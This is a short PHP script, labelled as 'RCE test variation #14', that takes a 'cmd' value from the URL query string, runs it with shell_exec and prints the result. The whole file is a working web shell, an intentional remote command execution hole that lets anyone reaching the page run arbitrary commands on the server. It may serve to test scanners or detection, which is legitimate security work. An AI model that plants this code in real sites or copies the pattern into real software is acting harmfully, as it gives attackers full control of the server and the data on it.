<?php
// RCE test variation #14
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>